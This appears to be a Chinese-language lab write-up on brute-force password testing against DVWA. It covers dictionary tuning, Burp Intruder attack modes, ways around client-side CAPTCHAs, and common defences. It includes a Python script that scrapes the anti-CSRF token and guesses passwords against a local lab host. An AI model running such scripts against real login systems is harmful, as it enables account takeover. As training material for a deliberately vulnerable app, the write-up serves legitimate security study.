    暴力破解测试流程

    1. 踩点：确认目标是否存在暴力破解的漏洞（确认被暴力破解的“可能性”）
    2. 优化字典
      1. 根据注册提示信息进行优化，对目标站点进行注册，搞清楚账号密码的一些限制，比如目标站点要求密码必须是6位以上，字母数字组合，则可以按照次优化字典，比如去掉不符合要求的密码。
      2. 如果爆破的是管理员后台，往往这种系统的管理员是admin/administrator/root的几率比较高，可以使用这个账号+密码，尝试登录，看返回结果确定用户名。
    3. 使用自动化工具

    intruder模块

    • Sniper：一个字典，先将第一个变量使用字典进行测试，然后在将第二个变量使用字典进行测试
    • Battering ram：一个字典，所有变量一起用字典内容被替换，然后一起尝试
    • Ptichfork：需要为每个变量导入一个字典，分别使用对应的字典对变量进行同时替换
    • Cluster bomb：需要为每个变量设置一个字典，分别使用字典内容组合对变量进行替换

    常用的payload type

    • simple list：手动添加字典列表，或导入bp自带的，或导入自定义的字典
    • runtime：大批量字典
    • numbers：数字
    • brutefocer：对输入的字符内容按照min length和max length进行组合，产生字典，然后爆破

    Payload processing是对添加的字典进行匹配，比如统一增加前缀、后缀

    • add prefix/suffix：对字典里面所有的内容加一个前缀/后缀
    • match/replace：对字典里面指定的内容A转化为B，比如将字典里面的所有1转化为c
    • hash：对字典进行hash
    • encode：对字典内容进行指定字符的转换


    验证码绕过问题

    客户端

    • 验证码在前端通过js实现：容易抓包重放绕过前端提交
    • 验证码输出在客户端上：在前端源码中输出客户端，容易被抓取
    • 在cookie中输入验证码：与源码中一样，容易被抓取

    服务端

    • 验证码不过期
    • 验证码过于简单，容易被猜测

    常见防范措施：

    • 增加验证码，且验证码机制不能太简单，或对用户认证增加user-token
    • 输入错误锁定的限制
    • 用户名密码，密文传输
    • 使用双因素认证：比如账号密码+证书

    开撸

    low级别

    没有防护，甚至还存在sql注入，可以使用万能密码登录

    直接改数据即可

    high级别


    这里多了token机制，但通过观察发现，返回的页面会带有一个token，利用这个返回的token就能继续下一次提交了。
    利用python脚本来操作吧

    import requests
from bs4 import BeautifulSoup

header = {'Host': '192.168.3.96:89',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
          'Referer': 'http://192.168.3.96:89/vulnerabilities/brute/',
          'cookie': 'PHPSESSID=aa4n09m2tc360cq1fdkv3n1i14; security=high',
          'Connection': 'close',
          'Upgrade-Insecure-Requests': '1'
          }
passwords = ['132135']
for password in passwords:
    req = requests.get(
        "http://192.168.3.96:89/vulnerabilities/brute/index.php", headers=header)
    soup1 = BeautifulSoup(req.text, 'html.parser')
    token = soup1.find_all('input')[3].get('value')
    url = 'http://192.168.3.96:89/vulnerabilities/brute/index.php?username=admin&password=' + \
        password+'&Login=Login&user_token='+token+'#'
    req2 = requests.get(url, headers=header)
    soup2 = BeautifulSoup(req2.text, 'html.parser')
    text = soup2.find('pre').contents[1]
    print(text)

    这里的username和password字段的字典可自行导入。
